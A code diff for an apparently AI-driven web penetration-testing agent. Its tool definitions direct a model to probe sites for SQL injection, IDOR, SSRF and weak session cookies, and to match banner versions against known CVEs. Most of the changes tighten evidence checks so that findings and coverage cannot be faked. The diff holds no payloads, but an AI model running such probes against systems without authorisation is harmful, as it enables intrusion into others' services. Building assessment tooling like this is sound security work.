+          for (const c of extractBackendLibs(body)) addLib(c, rec.id);
+        }
+        const libs = [...backendLibs.values()];
         return txt(
           JSON.stringify({
             fetched,
             components,
             inventory: formatTechInventory(components),
-            note: "Versions only. Each fetched URL has an evidenceId (the banner that revealed the version). Assess each (component, VERSION) against KNOWN CVEs. Skip components with version unknown — a product-family banner (Server: BigIP, APM/VPN cookies) plus historical CVEs that may apply is NOT a finding. The ⚠ KNOWN marks are deterministic JS-library matches. For a SERIOUS known CVE (High/Critical, exploitable class) on a MATCHED version, record verdict:'suspected' citing the evidenceId.",
+            backendLibs: libs,
+            backendLibInventory: formatTechInventory(libs),
+            backendLibHints: stackAttackHints([...components, ...libs]),
+            note: "Versions only. Each fetched URL has an evidenceId (the banner that revealed the version). Assess each (component, VERSION) against KNOWN CVEs. Skip components with version unknown — a product-family banner (Server: BigIP, APM/VPN cookies) plus historical CVEs that may apply is NOT a finding. The ⚠ KNOWN marks are deterministic JS-library matches. For a SERIOUS known CVE (High/Critical, exploitable class) on a MATCHED version, record verdict:'suspected' citing the evidenceId. backendLibs are GUESSES from response-body signals (stack traces, module paths, error pages, lockfile fragments, parser errors incl. bodies already in evidence — see evidenceRef) — they point at n-day attack classes; a hit is NOT a confirmed install. If a backend-lib carries a version, feed it to cve_lookup (kind 'backend-lib'); name-only hits stay leads — try harder to obtain a version (error pages, lockfiles, probe_parser) before spending CVE effort.",
           }),
         );
       },
@@ -3837,7 +5856,7 @@ export function buildTools(s: PilotSession) {
       async ({ components }) => {
         if (!s.cveLookup)
           return txt(JSON.stringify({ disabled: true, note: "Online CVE-DB lookup is OFF (operator did not pass --cve-lookup). Assess each component against your own CVE knowledge instead." }));
-        const KINDS = new Set(["server", "language", "framework", "cms", "frontend-lib"]);
+        const KINDS = new Set(["server", "language", "framework", "cms", "frontend-lib", "backend-lib"]);
         const comps: TechComponent[] = components.slice(0, 16).map((c) => ({
           kind: (KINDS.has(c.kind ?? "") ? c.kind : "frontend-lib") as TechComponent["kind"],
           name: c.name,
@@ -3875,6 +5894,7 @@ export function buildTools(s: PilotSession) {
         severity: z.enum(["info", "low", "medium", "high", "critical"]),
         category: z.enum(CATEGORIES),
         endpoint: z.string(),
+        method: z.string().optional().describe("HTTP method the vulnerable request used (GET/POST/…) — binds the check-ledger row to the exact exercised surface"),
         param: z.string().optional(),
         description: z.string(),
         reproSteps: z.string(),
@@ -3887,12 +5907,72 @@ export function buildTools(s: PilotSession) {
         anomaly: z.string().optional().describe("required for verdict=suspected: the ONE observed anomaly + why it is a lead (>=40 chars)"),
         observation: z.string().optional().describe("required for verdict=suspected: ONE cited evidenceId for the anomaly"),
       },
-      async ({ title, severity, category, endpoint, param, description, reproSteps, verdict, negativeControl, positiveReplays, effectMarker, anomaly, observation }) => {
+      async ({ title, severity, category, endpoint, method, param, description, reproSteps, verdict, negativeControl, positiveReplays, effectMarker, anomaly, observation }) => {
         // モデルの severity をカテゴリのバンドに clamp(同クラスでの High/Medium 混在を是正)。
         const normSev = normalizeSeverity(category, severity as Severity);
         // ── 共通コミット(dedup/merge/construct)。confirmed/suspected 両経路が使う。verdict は **昇格のみ**。 ──
+        // The finding's check row binds to the EXECUTION that produced the cited evidence — never to
+        // caller-supplied endpoint/method/param/role fields. A ledger row whose evidenceIds cover the
+        // cited set is authoritative for context; otherwise the evidence's own request (method, url,
+        // session headers) decides, and the actor resolves from the session ref — not from currentRole.
+        const findingCheckCtx = async (): Promise<{ ctx: Pick<CheckWrite, "target" | "param" | "subject" | "principal" | "tenant" | "origin" | "resource" | "session" | "sessionHeaders">; cover?: CheckExecution }> => {
+          const cited = new Set(evidenceIdsForCtx);
+          const cover = s.store
+            .checks(s.assessmentId)
+            .filter((r) => r.tool !== "record_finding" && r.status !== "planned" && r.evidenceIds.length > 0 && [...cited].every((id) => r.evidenceIds.includes(id)))
+            .sort((a, b) => a.evidenceIds.length - b.evidenceIds.length)[0];
+          if (cover)
+            return { cover, ctx: { target: cover.target, param: cover.param, subject: cover.subject, principal: cover.principal, tenant: cover.tenant, origin: cover.origin, resource: cover.resource, session: cover.session } };
+          const recs = evidenceIdsForCtx.map((id) => s.evidence.records.find((r) => r.id === id)).filter((r): r is NonNullable<typeof r> => !!r);
+          const leg = recs.find((r) => (positiveReplays ?? []).includes(r.id)) ?? recs[0];
+          if (!leg) return { ctx: { target: checkTargetOf(method ?? "GET", endpoint, s.targetUrl), param } };
+          const ref = sessionRefOf(leg.request.headers ?? {});
+          return {
+            ctx: {
+              target: checkTargetOf(leg.request.method ?? method ?? "GET", leg.request.url, s.targetUrl),
+              param,
+              origin: webOriginOf(leg.request.url, s.targetUrl),
+              sessionHeaders: leg.request.headers ?? {},
+              subject: await roleForSessionRef(s, ref),
+            },
+          };
+        };
+        let evidenceIdsForCtx: string[] = [];
+
         const commit = async (v: FindingVerdict, evidenceIds: string[], anomalyText?: string): Promise<string> => {
           s.recordCalls += 1;
+          evidenceIdsForCtx = evidenceIds;
+          const { ctx, cover } = await findingCheckCtx();
+          // The finding's check row binds to the EXECUTION that produced the cited evidence. When a probe
+          // ledger row covers the evidence set, update THAT row in place — its execution provenance (tool /
+          // target / param / actor / session) stays immutable and the finding links into it. Writing a fresh
+          // record_finding row with inherited dims would collide on the check key and overwrite the probe
+          // row's provenance, after which a second record_finding on the same evidence would lose the
+          // original context and fall back to caller labels.
+          const recordFindingRow = (fid: string, status: "found" | "suspected", title: string): void => {
+            if (cover) {
+              s.store.upsertCheck(s.assessmentId, {
+                ...cover,
+                status: cover.status === "found" ? "found" : status,
+                reason: title.slice(0, 200),
+                evidenceIds: [...new Set([...cover.evidenceIds, ...evidenceIds])],
+                findingIds: [...new Set([...cover.findingIds, fid])],
+                updatedAt: new Date().toISOString(),
+              });
+              return;
+            }
+            recordCheck(s, {
+              tool: "record_finding",
+              checkClass: coarseClass(category),
+              ...ctx,
+              param: ctx.param ?? param,
+              url: endpoint,
+              status,
+              reason: title.slice(0, 200),
+              evidenceIds,
+              findingIds: [fid],
+            });
+          };
           if (v === "confirmed") s.screenVerdict = "finding";
           else if (s.screenVerdict !== "finding") s.screenVerdict = "suspected"; // finding は上書きしない
           const key = dedupKey(category, endpoint, param, s.targetUrl);
@@ -3910,6 +5990,7 @@ export function buildTools(s: PilotSession) {
               type: "note",
               payload: { message: `↩ DEDUP ${existing.id} += "${title}" (${key}; ${existing.evidenceIds.length} ev, sev ${existing.severity}, ${findingVerdict(existing)})` },
             });
+            recordFindingRow(existing.id, findingVerdict(existing) === "confirmed" ? "found" : "suspected", existing.title);
             return `merged into ${existing.id} (same ${key}); now ${existing.evidenceIds.length} evidence, severity ${existing.severity}, verdict ${findingVerdict(existing)}. Do not re-report this endpoint+param.`;
           }
           s.findCounter += 1;
@@ -3954,6 +6035,10 @@ export function buildTools(s: PilotSession) {
           s.findings.push(f);
           s.findingsByKey.set(key, f);
           s.store.upsertFinding(s.assessmentId, f);
+          // The finding's own executed context is the ONLY check row it earns — bound to its real
+          // endpoint/param/actor. It never fans out to satisfy other slots (screen_done reads this row
+          // through planSatisfiedBy).
+          recordFindingRow(fid, v === "confirmed" ? "found" : "suspected", f.title);
           s.store.appendEvent(s.assessmentId, {
             type: "note",
             payload: { message: `${v === "suspected" ? "SUSPECTED" : "FINDING"} ${f.id}: ${f.title} [${f.severity}]${f.screenId ? ` @${f.screenId}` : ""}` },
@@ -3976,8 +6061,10 @@ export function buildTools(s: PilotSession) {
           }
           // analyze_session's deterministic cookie flags (secure/httponly/samesite/domain-scope) are an absence
           // class, exactly like headers: deterministically observable → confirm-or-skip, NEVER suspected, and
-          // never waved through the sessionGlance exemption below.
-          if (category === "session" && SESSION_COOKIE_ATTR_KEYS.has(param ?? ""))
+          // never waved through the sessionGlance exemption below — EXCEPT when the probe itself reported the
+          // observation unverified (no independent denied control could be established): then suspected citing
+          // the retained observation is the honest outcome.
+          if (category === "session" && SESSION_COOKIE_ATTR_KEYS.has(param ?? "") && !s.sessionFlagUnverified)
             return txt(`REJECTED: session cookie flag '${param}' is deterministically observable — analyze_session returns negativeControl + positiveReplays evidenceIds for it (absence class, like headers). Record verdict:"confirmed" with those evidenceIds, or skip. Do not file it suspected.`);
           // version-based CVE(未 exploit)は High/Critical(RCE/path-traversal/auth-bypass 級)だけ surface。
           //   medium/EOL-only の版ノートはアクション性が低くノイズ(PHP EOL・Bootstrap EOL・dev server 等)。
@@ -4028,6 +6115,12 @@ export function buildTools(s: PilotSession) {
         // ── CONFIRMED 経路 ── schema を optional 化したので、まず存在を手で強制(その後は従来どおり)。
         if (!negativeControl || !positiveReplays || positiveReplays.length < 2)
           return txt(`REJECTED: a confirmed finding requires 1 negativeControl + >=2 positiveReplays evidenceIds. If you have a real lead you cannot fully prove yet, use verdict:"suspected" with an 'anomaly' + one 'observation' instead of dropping it.`);
+        // Two replay REFERENCES must identify two real EXECUTIONS — the same evidence id cited twice
+        // is one request, not two replays. The control can likewise never stand in for a replay.
+        if (new Set(positiveReplays).size !== positiveReplays.length)
+          return txt("REJECTED: positiveReplays contains a duplicate evidenceId — each replay must be a distinct recorded execution.");
+        if (positiveReplays.includes(negativeControl))
+          return txt("REJECTED: the negativeControl evidenceId cannot also serve as a positive replay.");
         // auth-bypass は verify_access の機械判定を通った時だけ記録できる(CRM の 302/401 誤検知を硬く封じる)。
         if (category === "auth-bypass") {
           const av = s.accessVerdicts.get(normEndpoint(endpoint, s.targetUrl));
@@ -4035,6 +6128,26 @@ export function buildTools(s: PilotSession) {
             return txt(`REJECTED: verify_access on ${endpoint} returned 'not_bypass' (redirect→login / 401 / 403 = auth is enforced). Mechanical veto, cannot record.`);
           if (!av) return txt(`REQUIRED: run verify_access(${endpoint}) before recording auth-bypass (302→login / 401 / 403 is not a bypass).`);
         }
+        // ── IDOR: pre-compute the ledger match so it can VETO body heuristics. probe_authz's
+        //    'unexpected-access' comparison already encodes trusted expectations (operator deny/allow,
+        //    ACL exclusion, verified owner) — when it backs the cited evidence exactly, a response that
+        //    merely RESEMBLES a public directory cannot override it (and an operator allow never becomes
+        //    'unexpected-access' upstream, so an allow can't sneak in through this match either).
+        const azEp = normEndpoint(endpoint, s.targetUrl);
+        const posSet = new Set(positiveReplays);
+        const idorLedgerMatch = (category === "idor" || category === "idor-write")
+          ? s.store.authzComparisons(s.assessmentId).find(
+              (c) =>
+                c.outcome === "unexpected-access" &&
+                c.action === (category === "idor-write" ? "write" : "read") &&
+                c.endpoint === azEp &&
+                c.compareEvidenceIds.length >= 2 &&
+                new Set(c.compareEvidenceIds).size === c.compareEvidenceIds.length &&
+                c.compareEvidenceIds.length === posSet.size &&
+                c.compareEvidenceIds.every((id) => posSet.has(id)) &&
+                c.deniedEvidenceIds.includes(negativeControl!),
+            )
+          : undefined;
         // ── 証拠規律の構造強制 ── 引用 evidenceId が実在し、ネガコンが positive と区別でき、positive 同士が安定であること。
         const findEv = (eid: string) => s.evidence.records.find((r) => r.id === eid);
         const negRec = findEv(negativeControl);
@@ -4049,7 +6162,9 @@ export function buildTools(s: PilotSession) {
             return txt("REJECTED: measured timing evidence does not show two stable delayed replays with fast interleaved controls.");
           return txt(await commit("confirmed", [...new Set([negativeControl, ...positiveReplays, ...negRec.timingProof.controlIds])]));
         }
-        if (MARKER_BASED_CATEGORIES.has(category)) {
+        // GraphQL batching is a STRUCTURAL observation (single-object control vs array positives) — it has no
+        // effectMarker, so it must reach its own evidence branch below rather than the marker gate.
+        if (MARKER_BASED_CATEGORIES.has(category) && !(category === "info-disclosure" && param === "batching")) {
           // マーカーベース: 長さ差分でなく「印(effectMarker)」の有無で確証する。
           //   business-logic → probe_logic/probe_scenario の effectMarker / xss → 未エスケープ反射 / redirect → OOB host。
           if (!effectMarker)
@@ -4091,41 +6206,50 @@ export function buildTools(s: PilotSession) {
           if (missing.length === 0) return txt("REJECTED: cited responses already carry the checked security headers.");
           if (param && !missing.some((r) => r.key === param || r.header === param.toLowerCase()))
             return txt(`REJECTED: '${param}' is present (or not a checked rule). Missing: ${missing.map((r) => r.key).join(", ")}.`);
-        } else if (category === "rate-limit" && param === "batching") {
-          // GraphQL batching (probe_graphql): the marker is STRUCTURAL — positives are JSON ARRAYS of >=2 GraphQL
-          // results where the single-query control is a JSON object. Same rationale as headers: a deterministic
-          // shape the length/status differential cannot express (the array is exactly 2x a small body, same status).
+        } else if (param === "batching" && (category === "rate-limit" || category === "info-disclosure")) {
+          // GraphQL batching (probe_graphql): the marker is STRUCTURAL — positives are JSON ARRAYS of >=2
+          // GraphQL results where the single-query control is a JSON object. That shape proves a CAPABILITY
+          // (batching enabled) — it does NOT prove a rate-limit/lockout bypass, so the evidence supports an
+          // info-disclosure-class observation at info/low only. A bypass claim needs demonstrated harm (an
+          // actual limit defeated) which this evidence cannot show.
+          if (category === "rate-limit")
+            return txt("REJECTED: batching acceptance is a capability observation, not evidence that a rate limit or lockout was bypassed. Record it as category info-disclosure / param batching at info/low at most — or demonstrate an actual limit defeat with dedicated evidence first.");
           if (isGraphqlBatchResponse(negRec.response.body))
             return txt("REJECTED: the cited control ALSO returned an array — not a batching differential. Cite probe_graphql's single-query control.");
           if (!posRecs.every((r) => isGraphqlBatchResponse(r!.response.body)))
             return txt("REJECTED: batching positives are not JSON arrays of >=2 GraphQL results. Cite probe_graphql's batching positiveReplays evidenceIds.");
         } else if (category === "session" && SESSION_COOKIE_ATTR_KEYS.has(param ?? "")) {
-          // Absence class (analyze_session's deterministic cookie flags): same rationale as headers — two stable
-          // GETs of the same URL; the issue is a MISSING Set-Cookie attribute, so control and positives may cite
-          // the same response. Re-verify against the cited responses: reject when the attribute is actually
-          // present, the rule does not apply, or the session cookie is not identifiable from the evidence (a
-          // browser-jar observation is NOT recorded evidence — these never ride the sessionGlance exemption).
+          // Absence class (analyze_session's deterministic cookie flags): the negative control is an INDEPENDENT
+          // unauthenticated request the app actually refused — never one of the two authed positives, and every
+          // positive must carry the same missing attribute on its own Set-Cookie. Re-verify against the cited
+          // responses: reject when the control did not deny, the attribute is actually present, the rule does not
+          // apply, or the session cookie is not identifiable from the evidence (a browser-jar observation is NOT
+          // recorded evidence — these never ride the sessionGlance exemption).
           if (posRecs.length < 2) return txt("REJECTED: session cookie-flag findings require >=2 GET evidenceIds (analyze_session).");
+          if (!(negRec.response.status === 401 || negRec.response.status === 403 || isAuthRedirect(negRec.response) || isAuthWallBody(negRec.response)))
+            return txt("REJECTED: the cited negativeControl is not a denied unauthenticated request (401/403/login redirect or wall) — cite analyze_session's unauthenticated control evidenceId, not another authed GET.");
           const p0 = posRecs[0]!;
           if (looksLikeProxyError(p0.response.body))
             return txt("REJECTED: the cited response is an upstream proxy/connection error page (host unreachable through the proxy), not the target — the host was never actually reached. Do not record cookie-flag findings on it.");
           if (!posRecs.every((r) => r!.response.status === p0.response.status))
             return txt("REJECTED: session cookie-flag replays disagree (unstable).");
-          const sc = p0.response.headers["set-cookie"] ?? p0.response.headers["Set-Cookie"] ?? "";
-          const scSession = parseSetCookieLines(sc).filter((l) => isSessionCookieName(l.name));
-          if (scSession.length === 0)
-            return txt("REJECTED: the cited responses carry no session-cookie Set-Cookie to re-verify (a browser-jar observation is not recorded evidence). Run analyze_session at a URL whose response issues the cookie (e.g. the login response) and cite that.");
-          const recheck = auditSessionCookieFlags({
-            setCookie: sc,
-            requestCookieNames: parseCookieHeader((p0.request.headers ?? {})["cookie"] ?? (p0.request.headers ?? {})["Cookie"] ?? "").map((c) => c.name),
-            url: p0.request.url,
-          });
-          if (!recheck.findings.some((f) => f.key === param))
-            return txt(`REJECTED: '${param}' is present (or the rule does not apply, e.g. Secure on non-TLS) on the session cookie(s) ${scSession.map((l) => l.name).join(", ")} in the cited Set-Cookie.`);
+          for (const r of posRecs) {
+            const scR = r!.response.headers["set-cookie"] ?? r!.response.headers["Set-Cookie"] ?? "";
+            const scSession = parseSetCookieLines(scR).filter((l) => isSessionCookieName(l.name));
+            if (scSession.length === 0)
+              return txt("REJECTED: a cited replay carries no session-cookie Set-Cookie to re-verify (a browser-jar observation is not recorded evidence). Run analyze_session at a URL whose response issues the cookie (e.g. the login response) and cite that.");
+            const recheck = auditSessionCookieFlags({
+              setCookie: scR,
+              requestCookieNames: parseCookieHeader((r!.request.headers ?? {})["cookie"] ?? (r!.request.headers ?? {})["Cookie"] ?? "").map((c) => c.name),
+              url: r!.request.url,
+            });
+            if (!recheck.findings.some((f) => f.key === param))
+              return txt(`REJECTED: '${param}' is present (or the rule does not apply, e.g. Secure on non-TLS) on the session cookie(s) ${scSession.map((l) => l.name).join(", ")} in a cited replay.`);
+          }
         } else if (category !== "auth-bypass") {
           if (category === "sqli" && sqliHtmlLengthOnlyFp(negRec.response.body, posRecs.map((r) => r!.response.body), negRec.response.status, posRecs.map((r) => r!.response.status)))
             return txt("REJECTED: cited SQLi evidence is HTML/text length (search/result-page variance), not a JSON/XML boolean differential, a SQL error, or measured timing experiment. That is the Drupal/marketing-search false positive — do NOT confirm. Re-run probe_sqli and record only if it returns SQLi CONFIRMED.");
-          if ((category === "idor" || category === "idor-write") && posRecs.every((r) => classifyCrossUserBody(r!.response.body).class === "public-directory"))
+          if ((category === "idor" || category === "idor-write") && !idorLedgerMatch && posRecs.every((r) => classifyCrossUserBody(r!.response.body).class === "public-directory"))
             return txt("REJECTED: cited bodies are a PUBLIC DIRECTORY (tenant people-picker, or a store/location/dealer locator — og:type place, Find a Station, sequential store ids). Typically intended, not IDOR. Do not confirm. Mark idor tested-clean unless the body also has a person's phone/home address/SSN/DOB, another tenant's private object, or order/hold/document contents.");
           // IDOR proven by cross-user CONTENT, not length: if every positive carries real cross-user data (sensitive-pii /
           // private-object) that the control does not, a SMALL victim object (e.g. 30B vs a 13B denial, |Δ|<64) is still a
@@ -4146,17 +6270,32 @@ export function buildTools(s: PilotSession) {
               return txt(`REJECTED (evidence discipline): ${verdict.reason}. Get a negative control that fails + >=2 stable positive replays, then record.`);
           }
         }
+        // ── IDOR confirmed path rides the authz ledger (match pre-computed above so it also vetoes the
+        //    public-directory heuristic). The cited evidence must BE a probe_authz 'unexpected-access'
+        //    comparison's own legs — the EXACT unique set: its compareEvidenceIds equals these
+        //    positiveReplays (no padding with foreign ids, no duplicated replay standing in for the
+        //    second) and its denied control is this negativeControl. That binds the finding to the
+        //    comparison's verified actor/action/resource/origin/operation context. A probe_idor sweep
+        //    alone (private-looking body + denied control on an unproven owner) stays a LEAD.
+        if (category === "idor" || category === "idor-write") {
+          if (!idorLedgerMatch)
+            return txt(
+              `REJECTED: ${category} confirmation requires a probe_authz 'unexpected-access' comparison on ${azEp} — its compareEvidenceIds must BE the exact positiveReplays set you cite and its denied-control evidenceId must be your negativeControl (verified owner + denied control + stable replays). A probe_idor sweep result is a LEAD, not proof: run probe_authz(url, objectId, ownerRole, compareRole) to establish ownership and re-test, or record verdict:"suspected" with an 'anomaly'.`,
+            );
+          if (category === "idor-write" && idorLedgerMatch.action !== "write")
+            return txt("REJECTED: idor-write requires a mutating probe_authz leg (action:'write') — a POST that only reads is an idor READ.");
+        }
         const evidenceIds = [...new Set([negativeControl, ...positiveReplays])];
         return txt(await commit("confirmed", evidenceIds));
       },
     ),
     tool(
       "screen_done",
-      "Finish diagnosing the current screen. You MUST account for EVERY class the plan named: pass `coverage` with one entry per planned class — result 'found' (confirmed + recorded), 'suspected' (you saw a real anomaly but couldn't fully confirm — record_finding it as verdict:suspected), 'tested-clean' (actively probed, held), or 'not-applicable' (concrete reason it can't apply). Finding ONE hole does NOT let you skip the rest of the plan. verdict 'finding' if >=1 confirmed, 'suspected' if only suspected leads, else 'clean'.",
+      "Finish diagnosing the current screen. You MUST account for EVERY class the plan named: pass `coverage` with one entry per planned class — result 'found' (confirmed + recorded), 'suspected' (you saw a real anomaly but couldn't fully confirm — record_finding it as verdict:suspected), 'tested-clean' (actively probed, held), 'not-applicable' (concrete reason it can't apply), 'unverified' (you tried but couldn't reach a verdict — say why in `note`), or 'blocked' (a missing prerequisite like an expired role session). 'found'/'suspected'/'tested-clean' require a REAL execution row in the check ledger — the coverage array alone can never declare them. Finding ONE hole does NOT let you skip the rest of the plan. verdict 'finding' if >=1 confirmed, 'suspected' if only suspected leads, else 'clean'.",
       {
         verdict: z.enum(["finding", "suspected", "clean"]),
         coverage: z
-          .array(z.object({ class: z.string(), result: z.enum(["found", "suspected", "tested-clean", "not-applicable"]), note: z.string().optional() }))
+          .array(z.object({ class: z.string(), result: z.enum(["found", "suspected", "tested-clean", "not-applicable", "unverified", "blocked"]), note: z.string().optional() }))
           .optional()
           .describe("one entry per planned attack class (from get_screen.plannedClasses)"),
         note: z.string().optional(),
@@ -4178,6 +6317,47 @@ export function buildTools(s: PilotSession) {
             return txt(
               `NOT DONE — ${s.currentScreenId} carries ${sc.params.length} parameter(s) / ${sc.apis.length} API(s) but only passive/header checks ran (no active probe fired). Attack its input with at least one real probe (probe_params / probe_sqli / probe_ssrf / probe_idor / probe_redirect, or http_request with a crafted value) before closing — or skip_screen with a concrete reason if it genuinely has no testable surface.`,
             );
+        }
+        // ── Ledger gate ── bounded plan slots decide what actually ran; the coverage array is only the
+        //   model's accounting. A slot stays UNFULFILLED until a matching execution row exists. Coverage
+        //   may write honest-gap rows (not-applicable / unverified / blocked + a reason) — it can NEVER
+        //   conjure found/suspected/tested-clean. Unfulfilled + claimed-executed ⇒ NOT DONE.
+        const scrId = s.currentScreenId ?? "";
+        ensurePlanSlots(s, scrId);
+        const ledger = screenChecks({ checkExecutions: s.store.checks(s.assessmentId) }, scrId);
+        if (ledger.unstarted.length > 0) {
+          const byClass = new Map((coverage ?? []).map((c) => [coarseClass(c.class), c]));
+          for (const slot of ledger.unstarted) {
+            const entry = byClass.get(slot.checkClass);
+            const where = `${slot.checkClass} @${slot.target}${slot.param ? ` param:${slot.param}` : ""}`;
+            if (!entry)
+              return txt(
+                `NOT DONE — plan slot ${where} has no execution row and no coverage entry. Run a probe that actually exercises it, or mark it not-applicable/unverified/blocked with a concrete reason.`,
+              );
+            if (entry.result === "not-applicable" || entry.result === "unverified" || entry.result === "blocked") {
+              // A bare 'not-applicable' label is NOT a decision — without a concrete reason it collapses
+              // to `unverified` so the gap stays visible and the class never reads as conclusive.
+              const status = entry.result === "not-applicable" && !(entry.note ?? "").trim() ? "unverified" : entry.result;
+              // An honest-gap row satisfies THIS slot's scope (target+param) without claiming a verdict.
+              recordCheck(s, {
+                tool: "screen_done",
+                checkClass: slot.checkClass,
+                target: slot.target,
+                param: slot.param,
+                subject: slot.subject || undefined,
+                status,
+                reason: (entry.note?.trim() || (status === "unverified" ? "marked not-applicable with no concrete reason — unverifiable" : entry.result)).slice(0, 300),
+                detail: "coverage-declared gap — no execution row was produced for this slot",
+              });
+              continue;
+            }
+            // found/suspected claims can only be satisfied by the check row record_finding itself wrote for
+            // the finding's OWN executed context (its real endpoint/param/actor). Fanning one finding out
+            // across every unfulfilled slot of its class would fabricate coverage for inputs that never ran.
+            return txt(
+              `NOT DONE — plan slot ${where} is UNFULFILLED: coverage declares '${entry.result}' but no execution row exists for it (a coverage array alone cannot mark it ${entry.result}). Run the real probe for this input, or declare it not-applicable/unverified/blocked with a reason.`,
+            );
+          }
         }
         // screenVerdict は record_finding が維持する(commit、upgrade-only)。モデルの自己申告 verdict では上書きしない
         //   — 記録された実体(confirmed/suspected/無し)が screen status の権威。verdict はログ/返却にのみ使う。
@@ -4244,7 +6424,7 @@ export function buildTools(s: PilotSession) {
           if (res.status === base.status && Math.abs(res.body.length - base.len) <= 16) continue; // catch-all 除外
           const ct = (res.headers["content-type"] ?? "").split(";")[0] ?? "";
           hits.push({ path, status: res.status, type: ct, len: res.body.length, location: res.headers["location"] });
-          if (res.status < 400 && /html/.test(ct) && !s.visited.has(stripHash(url))) s.frontier.add(stripHash(url));
+          if (res.status < 400 && /html/.test(ct) && !roleNavigated(s).has(stripHash(url))) s.frontier.add(stripHash(url));
         }
         s.store.appendEvent(s.assessmentId, {
           type: "note",
@@ -4396,7 +6576,7 @@ export function buildTools(s: PilotSession) {
     // ───────────────────────── セッション解析(B) ─────────────────────────
     tool(
       "analyze_session",
-      "Dump ONE live authenticated request (Cookie + Authorization + Set-Cookie + cookie flags + JWT alg/claims) so YOU can judge whether the session LOOKS weak. Fires TWO authed GETs at `url` (default: current page / target). Hints (username-as-cookie, alg:none, short plaintext) are leads, not confirmation. JWT Bearer → also probe_jwt. To CONFIRM forgeability, http_request as another identity (invalid forged value must fail). If you cannot swap identity, record_finding(verdict:suspected, category session) citing the returned evidenceId. ALSO runs a DETERMINISTIC session-cookie attribute audit (absence class, like probe_headers): missing Secure (https only) / HttpOnly / SameSite (incl. SameSite=None) / a parent Domain on the session cookie (name matches sess|sid|auth|token|jwt|remember; locale/lang/theme/csrf/analytics noise is never checked) → deterministic[] findings + negativeControl/positiveReplays evidenceIds → record_finding(category session, param=secure|httponly|samesite|domain-scope) — confirmed absence, never suspected.",
+      "Dump ONE live authenticated request (Cookie + Authorization + Set-Cookie + cookie flags + JWT alg/claims) so YOU can judge whether the session LOOKS weak. Fires THREE requests at `url` (default: current page / target): TWO authed GETs plus ONE unauthenticated control interleaved between them (must be refused 401/403/login — an independent negative control). Hints (username-as-cookie, alg:none, short plaintext) are leads, not confirmation. JWT Bearer → also probe_jwt. To CONFIRM forgeability, http_request as another identity (invalid forged value must fail). If you cannot swap identity, record_finding(verdict:suspected, category session) citing the returned evidenceId. ALSO runs a DETERMINISTIC session-cookie attribute audit (absence class, like probe_headers): missing Secure (https only) / HttpOnly / SameSite (incl. SameSite=None) / a parent Domain on the session cookie (name matches sess|sid|auth|token|jwt|remember; locale/lang/theme/csrf/analytics noise is never checked) → deterministic[] findings + negativeControl/positiveReplays evidenceIds (three DISTINCT ids — the denied unauth control + the two authed replays, each showing the same missing flag) → record_finding(category session, param=secure|httponly|samesite|domain-scope) — confirmed absence, never suspected. If the unauthenticated control is NOT refused, the observation is UNVERIFIED: file verdict:suspected citing 'observation', or skip.",
       { url: z.string().optional() },
       async ({ url }) => {
         let pageUrl = url?.trim() || "";
@@ -4423,71 +6603,95 @@ export function buildTools(s: PilotSession) {
         const identities = [s.currentRole, ...[...s.roleCreds.values()].map((c) => c.username)].filter((x): x is string => Boolean(x && x.trim()));
         const cookies = jar.map((c) => glanceCookie(c, identities));
         // ── deterministic Set-Cookie attribute audit (absence class — same rationale as probe_headers: a missing
-        //    flag needs no control differential). Two authed GETs: #1 = negative control, #2 = positive replay;
-        //    absence findings legitimately cite #1 as both (headers works the same way).
-        const fire = async (kind: "negative_control" | "positive_replay", tag: string) => {
-          const req: HttpRequest = { method: "GET", url: pageUrl, headers: authHeaders(s), body: null };
+        //    flag needs no payload differential). Evidence discipline still applies: the negative control is an
+        //    INDEPENDENT unauthenticated GET the app must actually refuse (401/403/login redirect or wall) —
+        //    it can never double as a positive — plus TWO authed GETs that must both show the same missing flag.
+        const fire = async (kind: "negative_control" | "positive_replay", tag: string, authed = true) => {
+          const req: HttpRequest = authed
+            ? { method: "GET", url: pageUrl, headers: authHeaders(s), body: null }
+            : { method: "GET", url: pageUrl, headers: {}, body: null, inheritDefaultHeaders: false };
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
           const ev = s.evidence.record({
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-session",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
-            note: `session glance ${tag} (live authed request for the model to judge)`,
+            note: `session glance ${tag} (${authed ? "live authed request for the model to judge" : "unauthenticated control — must be refused"})`,
           });
           return { evId: ev.id, status: res.status, headers: res.headers, body: res.body };
         };
-        let g1: Awaited<ReturnType<typeof fire>>;
-        let g2: Awaited<ReturnType<typeof fire>>;
+        let p1: Awaited<ReturnType<typeof fire>>;
+        let ctrl: Awaited<ReturnType<typeof fire>>;
+        let p2: Awaited<ReturnType<typeof fire>>;
         try {
-          g1 = await fire("negative_control", "#1");
-          g2 = await fire("positive_replay", "#2");
+          p1 = await fire("positive_replay", "#1");
+          ctrl = await fire("negative_control", "unauth control", false);
+          p2 = await fire("positive_replay", "#2");
         } catch (e) {
           return txt(`ERROR: ${String(e).slice(0, 180)}`);
         }
-        const setCookie = g1.headers["set-cookie"] ?? g1.headers["Set-Cookie"] ?? "";
+        const ctrlDenied = ctrl.status === 401 || ctrl.status === 403 || isAuthRedirect(ctrl) || isAuthWallBody(ctrl);
+        const positivesOk = validAppBaseline(p1) && validAppBaseline(p2);
+        /** Confirmation-grade evidence structure: an independent denied control + two stable valid authed replays. */
+        const evidenceShape = ctrlDenied && positivesOk && p1.status === p2.status;
+        const setCookie = p1.headers["set-cookie"] ?? p1.headers["Set-Cookie"] ?? "";
         const bearerJwt = bearer ? peekJwt(bearer) : null;
         const hints = [
           ...cookies.flatMap((c) => c.hints.map((h) => `${c.name}: ${h}`)),
           ...(bearerJwt?.unsigned ? [`Bearer JWT alg=${bearerJwt.alg} looks unsigned`] : []),
         ];
-        const evidenceIds = [g1.evId, g2.evId];
+        const evidenceIds = [p1.evId, p2.evId];
         let deterministic: Array<{ key: string; cookieName: string; severity: string; evidenceIds: string[] }> = [];
         const deterministicNotes: string[] = [];
         let deterministicVerdict = "";
-        if (looksLikeProxyError(g1.body ?? "")) {
+        let confirmable = false;
+        if (looksLikeProxyError(p1.body ?? "")) {
           deterministicVerdict =
             "NOT CONFIRMED: the response is an upstream proxy/connection error page (host unreachable through the proxy), NOT the target — the host was never actually reached. Do NOT record cookie-flag findings on it.";
-        } else if (g1.status !== g2.status) {
